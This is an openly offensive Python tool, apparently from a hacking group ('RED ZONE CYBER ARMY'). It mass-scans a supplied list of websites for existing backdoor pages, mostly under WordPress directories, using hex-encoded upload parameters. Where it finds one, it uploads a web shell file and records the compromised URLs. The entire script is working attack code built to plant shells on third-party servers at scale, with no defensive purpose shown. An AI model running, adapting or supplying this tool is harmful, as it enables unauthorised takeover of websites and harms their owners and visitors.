from multiprocessing.dummy import Pool
import requests
import random
import string
import os
import platform
import subprocess
from colorama import init, Fore, Style
import urllib3
init(autoreset=True)
urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()


def set_console_title(new_title):
    os.system(f'title {new_title}')

from colorama import init, Fore, Style

init(autoreset=True)  # Initialize Colorama

def banner():
    banner_text = ('''
    {Fore.RED}âââââââ âââââââ âââââââ ââââââââ âââââââ ââââ   ââââââââââ {Style.RESET_ALL}
    {Fore.YELLOW}ââââââââââââââââââââââââââââââââââââââââââââââ  âââââââââââ{Style.RESET_ALL}
    {Fore.GREEN}âââââââ ââââââââââ  âââ  âââââ âââââââââââââââ âââ âââââââ{Style.RESET_ALL}
    {Fore.CYAN}ââââââââ ââââââââââ  âââ âââââ  âââââââââââââââââââ âââââââ{Style.RESET_ALL}
    {Fore.BLUE}âââ  âââââââââââââââââââââââââââââââââââââââ ââââââââââââââ{Style.RESET_ALL}
    {Fore.MAGENTA}âââ  ââââââââââ âââââââ ââââââââ âââââââ âââ  ââââââââââââ {Style.RESET_ALL}
    {Fore.WHITE}Telegram Group: https://t.me/Team_R3DZ0N3{Style.RESET_ALL}
    {Fore.WHITE}Shell multi Exploit{Style.RESET_ALL}
    '''.format(Fore=Fore, Style=Style))
    print(banner_text)

def clear_command_prompt():
    if platform.system() == 'Windows':
        subprocess.run('cls', shell=True)
    else:
        subprocess.run('clear', shell=True)


clear_command_prompt()
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
}


def generate_random_filename():
    characters = string.ascii_letters + string.digits
    random_filename = ''.join(random.choice(characters) for _ in range(10))
    return random_filename


def finder(i, paths):
    try:
        for path in paths:
            url = f'{i}/{path}'
            req_first = requests.get(url, timeout=10, headers=headers, verify=False)
            if 'cPanel Reset Password' in req_first.text:
                print(Fore.GREEN + f'vulnerable - {i}')
                open('Backdoors.txt', 'a').write(url + '\n')
                namefile = generate_random_filename() + '.php'
                files = {'tod_upl': (namefile, open('SHELL.php', 'rb')), 'upload': (None, 'Submit')}
                response = requests.post(url, headers=headers, files=files, verify=False)
                if 'Success!' in response.text:
                    print(f'SHELLS UPLOADED SUCCESSFULLY !\nSaved to {Fore.LIGHTGREEN_EX}Shells.txt')
                    open('Shells.txt', 'a').write(f'{i}/{namefile}\n')
                else:
                    print(Fore.LIGHTMAGENTA_EX + f'Upload Failed For : {i}')
                    print(Fore.RED + f'Not Vulnerable => {i}')
            else:
                print(Fore.RED + f'Not Vulnerable => {i}')
    except Exception as e:
        print(Fore.RED + f"Error occurred for {i}: {e}")


def main():
    set_console_title('CustomPrompt')
    set_console_title('  - AUTO EXPLOIT  by RED ZONE CYBER ARMY')
    banner()
    ad = input(' -  Liste : ')
    oppp = open(ad, 'r', errors='ignore').read().splitlines()
    paths = [
        'simple.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'classwithtostring.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'install.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'admin.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'chosen.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/js/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/sodium_compat/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/fonts/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',        
        'wp-includes/Text/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-admin/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-content/uploads/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',       
        'wp-includes/images/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',       
        'demo.oksypay.com/cgi-bin/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164', 
        'wp-includes/SimplePie/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/widgets/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',      
        'assets/mbr-switch-arrow/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',  
        'wp-includes/random_compat/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'v1/pdf/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'tpcx/images/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/pomo/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-content/uploads/complianz/snapshots/shell.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-admin/css/classwithtostring.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164', 
        'wp-admin/classwithtostring.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',     
        'wp-includes/images/crystal/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/blocks/media-text/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164',
        'wp-includes/Requests/index.php?p=2f686f6d652f7074317464616379696b39722f7075626c69635f68746d6c&tod=75706c6f6164'      
    ]
    deadcode = Pool(25)
    deadcode.starmap(finder, zip(oppp, [paths] * len(oppp)))


if __name__ == '__main__':
    main()
